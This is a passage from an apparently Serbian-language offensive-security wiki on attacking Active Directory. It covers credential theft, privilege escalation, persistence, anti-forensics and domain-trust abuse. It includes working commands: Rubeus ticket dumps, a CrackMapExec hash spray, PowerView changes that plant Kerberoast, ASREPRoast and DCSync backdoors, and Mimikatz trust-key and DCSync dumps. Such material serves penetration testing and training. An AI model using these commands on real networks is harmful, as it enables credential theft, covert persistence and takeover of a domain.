Kada pribaviš neke credential-e, možeš proveriti da li imaš pristup nekoj **mašini**. U tu svrhu možeš da upotrebiš **CrackMapExec** za pokušaj povezivanja sa više servera koristeći različite protokole, u skladu sa skeniranjem portova.

### Lokalna eskalacija privilegija

Ako si kompromitovao credential-e ili imaš sesiju kao običan korisnik domena i možeš da pristupiš **bilo kojoj mašini u domenu**, potraži put za **lokalnu eskalaciju privilegija i prikupljanje credential-a**. Lokalne administratorske privilegije mogu ti omogućiti da **izdumpuješ hash-eve drugih korisnika** iz memorije (LSASS) i lokalnog skladišta (SAM).

U ovoj knjizi postoji cela stranica o [**lokalnoj eskalaciji privilegija u Windows-u**](../windows-local-privilege-escalation/index.html) i [**checklist-a**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravi da upotrebiš [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tiketi trenutne sesije

**Malo je verovatno** da ćeš pronaći **tikete** u trenutnom korisniku **koji ti daju dozvolu za pristup** neočekivanim resursima, ali možeš proveriti:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Uz domenske kredencijale ili korisničku sesiju, ponovo razmotrite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): tehnike autentifikovane enumeracije i prinude mogu otkriti putanje za relay koje nisu bile dostupne tokom izviđanja bez autentifikacije.

### Potražite creds u deljenim fasciklama računara | SMB deljene fascikle

Sada kada imate neke osnovne kredencijale, trebalo bi da proverite možete li da **pronađete** neke **zanimljive datoteke koje se dele unutar AD-a**. To možete uraditi ručno, ali to je veoma dosadan i repetitivan zadatak (naročito ako pronađete stotine dokumenata koje treba da proverite).

[**Pratite ovaj link da biste saznali koje alate možete da koristite.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Ukradite NTLM creds

Ako možete da **pristupite drugim računarima ili deljenim fasciklama**, možete da **postavite datoteke** (kao što je SCF datoteka) koje će, ako im se nekako pristupi, **pokrenuti NTLM autentifikaciju prema vama**, pa možete da **ukradete** **NTLM challenge** i crackujete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala svakom autentifikovanom korisniku da **kompromituje kontroler domena**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacija privilegija u Active Directory-ju SA privilegovanim kredencijalima/sesijom

**Za sledeće tehnike nije dovoljan običan korisnik domena; potrebne su vam posebne privilegije/kredencijali za izvođenje ovih napada.**

### Izdvajanje hash-eva

Nadamo se da ste uspeli da **kompromitujete neki lokalni administratorski** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), uključujući relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokalnu eskalaciju privilegija](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da izdumpujete sve hash-eve iz memorije i lokalnog sistema.\
[**Pročitajte ovu stranicu da biste saznali različite načine za pribavljanje hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete da ga iskoristite da biste se **predstavljali kao taj korisnik**.\
Potrebno je da koristite neki **alat** koji će **obaviti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete da kreirate novu **sessionlogon** sesiju i **ubacite** taj **hash** u **LSASS**, tako da će se taj **hash koristiti prilikom svake NTLM autentifikacije.** To je poslednja opcija koju koristi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad služi za **korišćenje korisnikovog NTLM hash-a za traženje Kerberos karata**, kao alternativa uobičajenom Pass The Hash-u preko NTLM protokola. Zato može biti posebno **koristan u mrežama u kojima je NTLM protokol onemogućen** i u kojima je za autentifikaciju dozvoljen samo **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **kradu korisnikovu autentifikacionu kartu** umesto njegove lozinke ili hash vrednosti. Ukradena karta se zatim koristi za **predstavljanje kao taj korisnik**, čime se stiče neovlašćen pristup resursima i uslugama u mreži.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponovna upotreba kredencijala

Ako imate **hash** ili **lozinku** lokalnog administrato**ra**, pokušajte da se pomoću njih **lokalno prijavite** na druge **računare**.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Imajte na umu da je ovo prilično **noisy** i da bi **LAPS** to **mitigate**.

### Zloupotreba MSSQL-a i Trusted Links

Ako korisnik ima privilegije da **pristupi MSSQL instancama**, možda će moći da **izvršava komande** na MSSQL hostu (ako radi kao SA), da **ukrade** NetNTLM **hash** ili čak izvede **relay** **attack**.\
Ako je MSSQL instanca povezana s drugom instancom preko pouzdanog linka baze podataka, korisnik s privilegijama nad povezanom bazom možda će moći da **iskoristi odnos poverenja za izvršavanje upita na drugoj instanci**. Ovi odnosi poverenja mogu se ulančavati i na kraju možda doseći pogrešno konfigurisanu bazu podataka u kojoj korisnik može da izvršava komande.\
**Linkovi između baza podataka rade čak i preko forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zloupotreba platformi za IT inventar i deployment

Paketi trećih strana za inventar i deployment često omogućavaju moćne puteve do kredencijala i izvršavanja koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat s atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domenske privilegije na tom računaru, moći ćete da dumpujete TGT-ove iz memorije svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin prijavi na računar**, moći ćete da dumpujete njegov TGT i da se impersonate-ujete kao on koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation, mogli biste čak i da **automatski kompromitujete Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljena „Constrained Delegation“, moći će da se **impersonate-uje kao bilo koji korisnik radi pristupa određenim servisima na računaru**.\
Zatim, ako **kompromitujete hash** tog korisnika/računara, moći ćete da se **impersonate-ujete kao bilo koji korisnik** (čak i kao domain admini) radi pristupa određenim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Privilegija **WRITE** nad Active Directory objektom udaljenog računara omogućava postizanje izvršavanja koda s **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Zloupotreba dozvola/ACL-ova

Kompromitovani korisnik može imati neke **zanimljive privilegije nad određenim domenskim objektima** koje vam mogu omogućiti kasnije lateralno kretanje/**eskalaciju** privilegija.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Zloupotreba Printer Spooler servisa

Otkrivanje **Spool servisa koji sluša** unutar domena može se **zloupotrebiti** radi **pribavljanja novih kredencijala** i **eskalacije privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Zloupotreba sesija trećih strana

Ako **drugi korisnici** **pristupaju** **kompromitovanoj** mašini, moguće je **prikupiti kredencijale iz memorije**, pa čak i **ubaciti beacon-e u njihove procese** kako biste se impersonate-ovali kao oni.\
Korisnici sistemu obično pristupaju preko RDP-a, pa evo kako da izvedete nekoliko napada na RDP sesije trećih strana:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** omogućava upravljanje **lozinkom lokalnog Administrator naloga** na računarima pridruženim domenu i obezbeđuje da ona bude **nasumična**, jedinstvena i često **menjana**. Te lozinke se čuvaju u Active Directory-ju, a pristup je pomoću ACL-ova ograničen samo na ovlašćene korisnike. Uz dovoljne dozvole za pristup ovim lozinkama, moguće je preći na druge računare.


{{#ref}}
laps.md
{{#endref}}

### Krađa sertifikata

**Prikupljanje sertifikata** s kompromitovane mašine može biti način da eskalirate privilegije u okruženju:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Zloupotreba Certificate Templates

Ako su konfigurisani **ranjivi template-i**, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation s nalogom s visokim privilegijama

### Dumpovanje domenskih kredencijala

Kada dobijete privilegije **Domain Admin** ili, još bolje, **Enterprise Admin**, možete da **dumpujete** **domensku bazu podataka**: _ntds.dit_.

[**Više informacija o DCSync attack-u možete pronaći ovde**](dcsync.md).

[**Više informacija o krađi NTDS.dit fajla možete pronaći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Čitljivu rezervnu arhivu koja sadrži `ntds.dit` zajedno s `SYSTEM` hive-om treba smatrati izloženim materijalom direktorijuma čak i pre izdvajanja. Zastareo password hash ne znači da su ostali atributi objekata bezbedni: polja kao što je `description` mogu sadržati kredencijale ili operativne beleške. Najpre pregledajte nazive članova arhive i nemojte uključivati izdvojeni sadržaj baze podataka u uobičajene izlaze enumeracije.

### Privesc kao Persistence

Neke od prethodno razmatranih tehnika mogu se koristiti za persistence.\
Na primer, možete:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Učinite korisnike ranjivim na [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Dodelite korisniku privilegije [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** kreira **legitimnu kartu Ticket Granting Service (TGS)** za određenu uslugu koristeći **NTLM hash** (na primer, **hash računara**). Ova metoda se koristi za **pristup privilegijama usluge**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da napadač dođe do **NTLM hash-a naloga krbtgt** u Active Directory (AD) okruženju. Ovaj nalog je poseban zato što se koristi za potpisivanje svih **Ticket Granting Tickets (TGT)**, koje su neophodne za autentifikaciju unutar AD mreže.

Kada dođe do ovog hash-a, napadač može da kreira **TGT-ove** za bilo koji nalog koji odabere (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Oni su slični golden ticket-ima, ali su falsifikovani na način koji **zaobilazi uobičajene mehanizme za otkrivanje golden ticket-a.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Održavanje pristupa nalogu pomoću sertifikata**

**Posedovanje sertifikata naloga ili mogućnost njihovog zahtevanja** veoma je dobar način da održite pristup korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Održavanje pristupa domenu pomoću sertifikata**

**Sertifikati se mogu koristiti i za održavanje pristupa domenu sa visokim privilegijama:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupa AdminSDHolder

Objekat **AdminSDHolder** u Active Directory-ju obezbeđuje zaštitu **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) tako što na njih primenjuje standardnu **Access Control List (ACL)**, čime sprečava neovlašćene izmene. Međutim, ova funkcija može da se zloupotrebi: ako napadač izmeni ACL objekta AdminSDHolder tako da običnom korisniku dodeli potpuni pristup, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova bezbednosna mera, čija je svrha zaštita, može se tako obiti o glavu i omogućiti neovlašćen pristup ako se ne nadgleda pažljivo.

[**Više informacija o grupi AdminDSHolder možete pronaći ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM akreditivi

Na svakom **Domain Controller (DC)** серверу постоји налог **локалног администратора**. Ако добијете административна права на таквој машини, хеш локалног налога Administrator може да се извуче помоћу **mimikatz**-а. Затим је потребно изменити регистар да би се **омогућила употреба ове лозинке**, чиме се омогућава даљински приступ локалном налогу Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Одржавање приступа помоћу ACL-а

Можете да **доделите** кориснику **посебне дозволе** над одређеним објектима домена, што ће му омогућити да **ескалира привилегије у будућности**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Безбедносни дескриптори

**Безбедносни дескриптори** се користе за **чување** **дозвола** које **објекат** има **над** неким **објектом**. Ако можете да унесете само **малу измену** у **безбедносни дескриптор** објекта, можете добити веома занимљиве привилегије над тим објектом, а да не морате бити члан привилеговане групе.


{{#ref}}
security-descriptors.md
{{#endref}}

### Анти-форензика / избегавање помоћу Dynamic Objects

Злоупотребите помоћну класу `dynamicObject` да бисте креирали краткотрајне principals/GPO-ове/DNS записе помоћу `entryTTL`/`msDS-Entry-Time-To-Die`; они се сами бришу без tombstone записа, чиме се уклањају LDAP докази, али остају напуштени SID-ови, неисправне `gPLink` референце или кеширани DNS одговори (нпр. загађивање ACE-а у AdminSDHolder-у или злонамерна преусмеравања `gPCFileSysPath`/AD-integrated DNS-а).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Измените **LSASS** у меморији да бисте поставили **универзалну лозинку**, која омогућава приступ свим налозима домена.


{{#ref}}
skeleton-key.md
{{#endref}}

### Прилагођени SSP

[Овде сазнајте шта је SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Можете да креирате **сопствени SSP** како бисте **прикупљали** **акредитиве** који се користе за приступ машини у **обичном тексту**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Он региструје **нови Domain Controller** у AD-у и користи га за **уписивање атрибута** (SIDHistory, SPN-ова...) на одређене објекте, а да притом не оставља никакве **логове** о **изменама**. Потребне су вам привилегије **DA** и морате бити унутар **root домена**.\
Имајте на уму да ће се појавити прилично ружни логови ако употребите погрешне податке.


{{#ref}}
dcshadow.md
{{#endref}}

### Одржавање приступа помоћу LAPS-а

Раније смо говорили о томе како да ескалирате привилегије ако имате **довољно дозвола за читање LAPS лозинки**. Међутим, ове лозинке могу да се користе и за **одржавање приступа**.\
Погледајте:


{{#ref}}
laps.md
{{#endref}}

## Ескалација привилегија у Forest-у - поверења домена

Microsoft сматра да је **Forest** безбедносна граница. То значи да **компромитовање једног домена потенцијално може довести до компромитовања целог Forest-а**.<sup>[[1]](#references)</sup>

### Основне информације

[**Поверење домена**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) је безбедносни механизам који омогућава кориснику из једног **домена** да приступи ресурсима у другом **домену**. Оно у суштини успоставља везу између система за аутентификацију два домена, омогућавајући несметану размену провера аутентификације. Када домени успоставе поверење, размењују и чувају одређене **кључеве** у својим **Domain Controller-има (DC-овима)**, који су кључни за интегритет поверења.

У уобичајеном случају, ако корисник жели да приступи услузи у **домену од поверења**, прво мора да затражи посебну карту, познату као **inter-realm TGT**, од DC-а свог домена. Овај TGT је шифрован заједничким **кључем** око ког су се оба домена договорила. Корисник затим предаје овај TGT **DC-у домена од поверења** да би добио сервисну карту (**TGS**). Када DC домена од поверења успешно провери inter-realm TGT, издаје TGS, чиме кориснику одобрава приступ услузи.

**Кораци**:

1. **Клијентски рачунар** у **Домену 1** започиње поступак користећи свој **NTLM hash** за захтев **Ticket Granting Ticket (TGT)**-а од свог **Domain Controller-а (DC1)**.
2. DC1 издаје нови TGT ако је клијент успешно аутентификован.
3. Клијент затим од DC1 тражи **inter-realm TGT**, који је неопходан за приступ ресурсима у **Домену 2**.
4. Inter-realm TGT је шифрован **кључем поверења** који DC1 и DC2 деле у оквиру двосмерног поверења домена.
5. Клијент преноси inter-realm TGT **Domain Controller-у Доменa 2 (DC2)**.
6. DC2 проверава inter-realm TGT помоћу заједничког кључа поверења и, ако је важећи, издаје **Ticket Granting Service (TGS)** за сервер у Домену 2 коме клијент жели да приступи.
7. На крају, клијент предаје овај TGS серверу, који је шифрован hash-ом налога сервера, да би добио приступ услузи у Домену 2.

### Различита поверења

Важно је напоменути да поверење може бити **једносмерно или двосмерно**. У случају двосмерног поверења, оба домена верују један другом, док је код **једносмерног** односа поверења један домен **домен од поверења**, а други **домен који указује поверење**. У другом случају, **моћи ћете да приступате ресурсима у домену који указује поверење само из домена од поверења**.

Ако Домен A верује Домену B, A је домен који указује поверење, а B је домен од поверења. Осим тога, у **Домену A** то би било **излазно поверење**, а у **Домену B** — **улазно поверење**.

**Различити односи поверења**

- **Parent-Child поверења**: Ово је уобичајено подешавање унутар истог forest-а, где child домен аутоматски има транзитивно двосмерно поверење са својим parent доменом. То у суштини значи да захтеви за аутентификацију могу несметано да се размењују између parent и child домена.
- **Cross-link поверења**: Позната и као „shortcut trust“, ова поверења се успостављају између child домена како би се убрзао поступак прослеђивања. У сложеним forest-има, захтеви за аутентификацију обично морају да путују до корена forest-а, а затим до циљног домена. Успостављањем cross-link поверења скраћује се овај пут, што је посебно корисно у географски распршеним окружењима.
- **External поверења**: Успостављају се између различитих, неповезаних домена и по природи нису транзитивна. Према [Microsoft-овој документацији](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external поверења су корисна за приступ ресурсима у домену ван текућег forest-а који није повезан forest поверењем. Безбедност се унапређује SID filtering-ом код external поверења.
- **Tree-root поверења**: Ова поверења се аутоматски успостављају између root домена forest-а и новододатог tree root-а. Иако се не срећу често, важна су за додавање нових стабала домена у forest, јер им омогућавају да задрже јединствено име домена и обезбеђују двосмерну транзитивност. Више информација можете пронаћи у [Microsoft-овом водичу](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest поверења**: Ова врста поверења је двосмерно транзитивно поверење између два root домена forest-а, које такође примењује SID filtering ради унапређења безбедности.
- **MIT поверења**: Ова поверења се успостављају са Kerberos доменима који нису Windows и усклађени су са [RFC4120](https://tools.ietf.org/html/rfc4120). MIT поверења су специјализованија и намењена су окружењима која захтевају интеграцију са системима заснованим на Kerberos-у ван Windows екосистема.

#### Друге разлике у **односима поверења**

- Однос поверења може бити и **транзитиван** (A верује B-у, B верује C-у, па A верује C-у) или **нетранзитиван**.
- Однос поверења може бити **двосмерно поверење** (оба домена верују један другом) или **једносмерно поверење** (само један од њих верује другом).

### Путања напада

1. **Набројте** односе поверења.
2. Проверите да ли неки **безбедносни principal** (корисник/група/рачунар) има **приступ** ресурсима **другог домена** — можда преко ACE уноса или зато што је члан група другог домена. Потражите **односе између домена** (вероватно је то разлог због ког је поверење успостављено).
   1. У овом случају, kerberoast би могао бити још једна опција.
3. **Компромитујте** **налоге** који могу да се користе за **прелазак** између домена.

Нападачи могу да приступе ресурсима у другом домену помоћу три главна механизма:

- **Чланство у локалној групи**: Principals могу бити додати у локалне групе на рачунарима, као што је група „Administrators“ на серверу, што им даје значајну контролу над тим рачунаром.
- **Чланство у групи страног домена**: Principals такође могу бити чланови група у страном домену. Међутим, ефикасност овог метода зависи од врсте поверења и опсега групе.
- **Access Control Lists (ACL)**: Principals могу бити наведени у **ACL-у**, нарочито као субјекти у **ACE-овима** унутар **DACL-а**, чиме им се даје приступ одређеним ресурсима. За оне који желе детаљније да се упознају са механизмима ACL-ова, DACL-ова и ACE-ова, whitepaper под називом „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)“ представља изузетно користан извор.<sup>[[17]](#references)</sup>

### Проналажење спољних корисника/група са дозволама

Можете проверити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** да бисте пронашли стране безбедносне principals у домену. То ће бити корисници/групе из **спољног домена/forest-а**.

То можете проверити у **Bloodhound-у** или помоћу powerview-а:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Eskalacija privilegija sa podređenog domena na nadređeni domen u šumi

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Drugi načini za enumerisanje poverenja domena:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Postoje **2 pouzdana ključa**, jedan za _Child --> Parent_, a drugi za _Parent_ --> _Child_.\
> Ključ koji koristi trenutni domen možete pronaći pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte do Enterprise admin u child/parent domenu zloupotrebom poverenja pomoću SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Eksploatacija upisivog Configuration NC-a

Razumevanje načina na koji se Configuration Naming Context (NC) može eksploatisati od ključnog je značaja. Configuration NC služi kao centralno skladište konfiguracionih podataka u šumi u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) u šumi, a upisivi DC-ovi održavaju upisivu kopiju Configuration NC-a. Da bi se ovo iskoristilo, neophodne su **SYSTEM privilegije na DC-u**, po mogućstvu na child DC-u.

**Povezivanje GPO-a sa lokacijom root DC-a**

Kontejner Sites u Configuration NC-u sadrži informacije o lokacijama svih računara pridruženih domenu u AD šumi. Napadači koji imaju SYSTEM privilegije na bilo kom DC-u mogu da povežu GPO-ove sa lokacijama root DC-a. Ovim se potencijalno kompromituje root domen manipulisanim smernicama koje se primenjuju na te lokacije.

Za detaljnije informacije možete proučiti istraživanje o [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Kompromitovanje bilo kog gMSA naloga u šumi**

Jedan od vektora napada jeste ciljanje privilegovanih gMSA naloga u domenu. KDS Root key, neophodan za izračunavanje lozinki za gMSA naloge, čuva se u Configuration NC-u. Sa SYSTEM privilegijama na bilo kom DC-u moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA u šumi.

Detaljnu analizu i uputstva korak po korak možete pronaći u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Dopunski napad pomoću delegiranog MSA-a (BadSuccessor – zloupotreba atributa migracije):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatno istraživanje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Napad izmenom šeme**

Ova metoda zahteva strpljenje i čekanje da se kreiraju novi privilegovani AD objekti. Uz SYSTEM privilegije, napadač može da izmeni AD Schema tako da bilo kom korisniku dodeli potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa novokreiranim AD objektima i njihove kontrole.

Više informacija dostupno je u tekstu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Od DA do EA pomoću ADCS ESC5**

Ranjivost ADCS ESC5 cilja kontrolu nad objektima Public Key Infrastructure (PKI) kako bi se kreirao certificate template koji omogućava autentifikaciju kao bilo koji korisnik u šumi. Pošto se PKI objekti nalaze u Configuration NC-u, kompromitovanje upisivog child DC-a omogućava izvođenje ESC5 napada.

Više detalja možete pročitati u tekstu [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> U okruženjima bez ADCS-a, napadač može da podesi neophodne komponente, kao što je opisano u tekstu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Spoljni domen šume – jednosmerno (dolazno) ili dvosmerno

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

U ovom scenariju **vašem domenu veruje eksterni domen**, koji vam daje **neutvrđene dozvole** nad njim. Moraćete da utvrdite **koji bezbednosni subjekti vašeg domena imaju koji nivo pristupa eksternom domenu**, a zatim da pokušate da to zloupotrebite:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni domen šume - jednosmerno (izlazno)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

U ovom scenariju **vaš domen** **ukazuje poverenje** principalu iz **drugih domena**.

Međutim, kada **domen ukazuje poverenje** drugom domenu, pouzdani domen **kreira korisnika** sa **predvidivim imenom** i **lozinkom koja je ista kao lozinka poverenja**. To znači da je moguće **pristupiti korisniku iz domena koji ukazuje poverenje i ući u pouzdani domen**, kako biste ga enumerisali i pokušali da eskalirate privilegije:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način da kompromitujete pouzdani domen jeste da pronađete [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiran u **suprotnom smeru** od poverenja između domena (što nije baš uobičajeno).

Drugi način da kompromitujete pouzdani domen jeste da sačekate na mašini kojoj **korisnik iz pouzdanog domena može da pristupi** kako bi se prijavio preko **RDP-a**. Zatim bi napadač mogao da ubaci kod u proces RDP sesije i odatle **pristupi izvornom domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj hard disk**, napadač bi iz procesa **RDP sesije** mogao da postavi **backdoor-e** u **startup folder hard diska**. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe poverenja između domena

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history preko poverenja između forest-a ublažava se pomoću SID Filtering-a, koji je podrazumevano aktiviran za sva poverenja između forest-a. To se zasniva na pretpostavci da su poverenja unutar forest-a bezbedna, pri čemu se forest, a ne domen, smatra bezbednosnom granicom, u skladu sa Microsoftovim stavom.
- Međutim, postoji kvaka: SID filtering može da ometa aplikacije i pristup korisnika, zbog čega se ponekad deaktivira.

### **Selective Authentication:**

- Za poverenja između forest-a, korišćenjem Selective Authentication osigurava se da se korisnici iz dva forest-a ne autentifikuju automatski. Umesto toga, potrebne su eksplicitne dozvole da bi korisnici pristupili domenima i serverima unutar domena ili forest-a koji ukazuje poverenje.
- Važno je napomenuti da ove mere ne štite od zloupotrebe upisivog Configuration Naming Context-a (NC) niti od napada na nalog poverenja.

[**Više informacija o poverenjima između domena na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Zloupotreba AD-a zasnovana na LDAP-u iz implantata na hostu

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponovo implementira LDAP primitive u stilu bloodyAD-a kao x64 Beacon Object Files koji se izvršavaju u potpunosti unutar implantata na hostu (npr. Adaptix C2). Operateri kompajliraju paket pomoću `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim pozivaju `ldap <subcommand>` iz beacon-a. Sav saobraćaj koristi trenutni bezbednosni kontekst prijave preko LDAP-a (389) sa signing/sealing-om ili LDAPS-a (636) uz automatsko prihvatanje sertifikata, tako da nisu potrebni socks proxy-ji ni artefakti na disku.<sup>[[4]](#references)</sup>

### LDAP enumeracija sa strane implantata

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` razrešavaju kratka imena/OU putanje u pune DN-ove i izbacuju odgovarajuće objekte.
- `get-object`, `get-attribute` i `get-domaininfo` preuzimaju proizvoljne atribute (uključujući security descriptor-e), kao i metapodatke o forest-u/domeni iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` direktno iz LDAP-a otkrivaju kandidate za roasting, podešavanja delegacije i postojeće deskriptore za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
